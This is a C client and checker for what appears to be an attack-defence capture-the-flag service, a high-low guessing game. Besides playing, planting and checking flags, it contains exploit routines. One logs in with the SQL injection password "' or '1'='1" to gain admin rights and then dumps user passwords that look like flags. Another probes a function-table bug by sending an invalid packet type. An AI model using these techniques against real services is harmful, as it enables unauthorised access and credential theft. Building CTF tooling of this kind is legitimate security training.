#include "protocol.h"
#include "user.h"
#include <errno.h>
#include <ctype.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <getopt.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <netinet/in.h>

typedef enum {
    CHECK,
    PLANT,
    EXPLOITABLE,
    LIST_FLAGS,
    PLAY
} Action;

#define ACTION_NAME(a) ((a) == CHECK ? "CHECK" : (a) == PLANT ? "PLANT" : (a) == EXPLOITABLE ? "EXPLOITABLE" : "UNKNOWN")

struct option options[] = {
    { "user", required_argument, NULL, 'u' },
    { "pass", required_argument, NULL, 'p' },
    { "host", required_argument, NULL, 'h' },
    { "port", required_argument, NULL, 'o' },
    { "check", no_argument, NULL, 'c' },
    { "plant", no_argument, NULL, 'l' },
    { "exploitable", no_argument, NULL, 'e' },
    { "list-flags", no_argument, NULL, 'f' },
    { "play", no_argument, NULL, 'y' },
    { 0, 0, 0, 0}
};

static int read_packet(int s, Packet * p) {
    int bytes_read;
    int total_read = 0;
    while ((bytes_read = read(s, p, sizeof(Packet))) > 0) {
        total_read += bytes_read;
        if (PACKET_FULL(p, total_read)) {
            return p->header.type;
        }
    }
    return MSG_TYPE_BAD;
}

static int write_packet(int s, Packet * p) {
    int r;
    r = write(s, p, PACKET_SIZE(p)) == PACKET_SIZE(p);
    return r;
}

static int create_connected_socket(const char * host, const int port) {
    int s = -1;
    struct sockaddr_in addr;
    if ((s = socket(AF_INET, SOCK_STREAM, 0)) >= 0) {
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = inet_addr(host);
        addr.sin_port = htons(port);
        if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
            close(s);
            s = -1;
            printf("Could not connect to %s:%d\n", host, port);
        }
    } else {
        printf("Could not create socket: %d\n", s);
    }
    return s;
}

static int login(int s, char * user, char * pass, Packet * packet) {
    packet->header.type = MSG_TYPE_AUTH;
    packet->header.size = sizeof(Auth);
    strncpy(packet->data.auth.name, user, USERNAME_SIZE);
    strncpy(packet->data.auth.password, pass, PASSWORD_SIZE);
    
    return write_packet(s, packet) && read_packet(s, packet) == MSG_TYPE_AUTH_SUCCESS;
}

static HighLow automatic_play(int round, int low, int high, int number) {
    int pivot = (high-low) / 2 + low;
    return number < pivot ? HIGHER : LOWER;
}

static HighLow human_play(int round, int low, int high, int number) {
    char answer[3];
    printf("Round %d - Number is %d\n", round, number);
    printf("Is the next higher or lower [h/l]: ");
    fflush(stdout);
    fgets(answer, 3, stdin);
    return answer[0] == 'h' ? HIGHER : LOWER;
}

int actually_play(int s, Packet * packet, HighLow(*callback)(int round, int low, int high, int number)) {
    packet->header.type = MSG_TYPE_NEW_GAME;
    packet->header.size = 0;

    while (write_packet(s, packet) && read_packet(s, packet) == MSG_TYPE_ROUND) {
        packet->header.type = MSG_TYPE_GUESS;
        packet->header.size = sizeof(Guess);
        packet->data.guess.answer = callback(packet->data.round.round, packet->data.round.low, packet->data.round.high, packet->data.round.number);
    }
    return packet->header.type == MSG_TYPE_GAME_OVER;
}

static int play(int s, Packet * packet, int num_games, HighLow(*callback)(int round, int low, int high, int number)) {
    int result;
    while (num_games-- > 0 && (result = actually_play(s, packet, callback))) {
    }
    return result;
}

static int function_table_exploitable(char * host, int port, Packet * packet) {
    int result = 0, s;

    s = create_connected_socket(host, port);
    if (s >= 0) {
        if (login(s, "ctfuser", "ctfpass", packet)) {
            packet->header.type = -100;
            packet->header.size = 0;
            result = (write_packet(s, packet) && read_packet(s, packet) == MSG_TYPE_BAD);
        }
        close(s);
    }

    return result;
}

static int auth_sql_injectable(char * host, int port, Packet * packet) {
    int result = 0, s;
    s = create_connected_socket(host, port);
    if (s >= 0) {
        if (login(s, "", "' or '1'='1", packet) && packet->data.auth_success.user_id == 1) {
            result = 1;
        }
        close(s);
    }
    return result;
}

int is_hex(char * str) {
    while (*str) {
        if (!isxdigit(*str)) {
            return 0;
        }
        str++;
    }
    return 1;
}

int is_flag(char * str) {
    return strlen(str) == 64 && is_hex(str);
}

void do_nothing_highscore(int position, HighscoreEntry * entry) {
}

void print_highscore(int position, HighscoreEntry * entry) {
    printf("%2d) %s - %d\n", (position + 1), entry->name, entry->score);
}

static int iterate_highscore(int s, Packet * packet, void (*callback)(int position, HighscoreEntry * entry)) {
    int i, result = 0;
    packet->header.type = MSG_TYPE_REQUEST_HIGHSCORE;
    packet->header.size = 0;
    if (write_packet(s, packet) && read_packet(s, packet) == MSG_TYPE_HIGHSCORE) {
        result = 1;
        for (i = 0; i < packet->header.size / sizeof(HighscoreEntry); i++) {
            callback(i, &packet->data.highscore.entries[i]);
        }
    }
    return result;
}

static void iterate_user_details(int s, Packet * packet, void(*callback)(User * user)) {
    int i, keep_going = 0, cur = 0, num = -1;
    Packet d;
    do {
        keep_going = 0;
        packet->header.type = MSG_TYPE_LIST_USERS;
        packet->header.size = sizeof(ListUsers);
        packet->data.list_users.first = cur;
        packet->data.list_users.number = MAX_USERS;
        if (write_packet(s, packet) && read_packet(s, packet) == MSG_TYPE_USER_LIST) {
            num = packet->data.user_list.total;
            cur += packet->data.user_list.num;
            for (i = 0; i < packet->data.user_list.num; i++) {
                d.header.type = MSG_TYPE_DETAIL_USER;
                d.header.size = sizeof(DetailUser);
                strncpy(d.data.detail_user.name, packet->data.user_list.names[i], USERNAME_SIZE);
                if (write_packet(s, &d) && read_packet(s, &d) == MSG_TYPE_USER_DETAILS) {
                    if (is_flag(d.data.user_details.user.password)) {
                        printf("%s\n", d.data.user_details.user.password);
                    }
                }
            }
            keep_going = (cur != num);
        }
    } while (keep_going);
}

static void write_user_password_as_flag(User * user) {
    if (is_flag(user->password)) {
        printf("%s\n", user->password);
    }
}

static int list_flags_auth_sql_injection(char * host, int port, Packet * packet) {
    int s, result = 0;
    if ((s = create_connected_socket(host, port)) >= 0) {
        if (login(s, "", "' or '1'='1", packet) && packet->data.auth_success.user_permissions & PERMISSION_ADMIN) {
            /* Gained admin access */
            iterate_user_details(s, packet, write_user_password_as_flag);
        }
    }
    return result;
}

static int list_flags(char * host, int port, Packet * packet) {
    return list_flags_auth_sql_injection(host, port, packet);
}

static int exploitable(char * host, int port, Packet * packet) {
    int count = 0;
    if (auth_sql_injectable(host, port, packet)) count++;
    if (function_table_exploitable(host, port, packet)) count++;
    printf("%d exploitable vulnerabilities detected\n", count);

    return count;
}

int main(int argc, char *argv[]) {
    char * user = NULL,
         * pass = NULL,
         * host = NULL,
         * port = NULL;
    Action action = PLANT;
    Packet packet;
    int opt, opt_idx = 0, result = 1, s;

    while ((opt = getopt_long(argc, argv, "u:p:h:o:clefy", options, &opt_idx)) != -1) {
        switch (opt) {
            case 'u':
                user = optarg;
            break;
            case 'p':
                pass = optarg;
            break;
            case 'h':
                host = optarg;
            break;
            case 'o':
                port = optarg;
            break;
            case 'l':
                action = PLANT;
            break;
            case 'c':
                action = CHECK;
            break;
            case 'e':
                action = EXPLOITABLE;
            break;
            case 'f':
                action = LIST_FLAGS;
            break;
            case 'y':
                action = PLAY;
            break;
            case '?':
            break;
        }
    }

    srand(time(NULL));
    if (host && port && (action == EXPLOITABLE || action == LIST_FLAGS || (user && pass))) {
        if (action == EXPLOITABLE) {
            result = !(exploitable(host, atoi(port), &packet));
        } else if (action == LIST_FLAGS) {
            result = list_flags(host, atoi(port), &packet);
        } else {
            if ((s = create_connected_socket(host, atoi(port))) >= 0) {
                if (login(s, user, pass, &packet)) {
                    if (action == PLAY) {
                        printf("You are logged in as a %s user\n", packet.data.auth_success.user_permissions & PERMISSION_ADMIN ? "admin" : "normal");
                        result = 0;
                        iterate_highscore(s, &packet, print_highscore);
                        play(s, &packet, 1, human_play);
                        printf("The number was %d\n", packet.data.game_over.number);
                    } else {
                        result = !(play(s, &packet, rand() % 50 + 50, automatic_play) && iterate_highscore(s, &packet, do_nothing_highscore));
                        if (result == 0) {
                            printf("Successfully %s flag\n", action == PLANT ? "planted" : "checked");
                        } else {
                            printf("Could not %s flag\n", action == PLANT ? "plant" : "check");
                        }
                    }
                    close(s);
                }
            } else {
                result = 1;
            }
        }
    } else {
        printf("Missing arguments\n");
        result = 1;
    }

    return result;
}
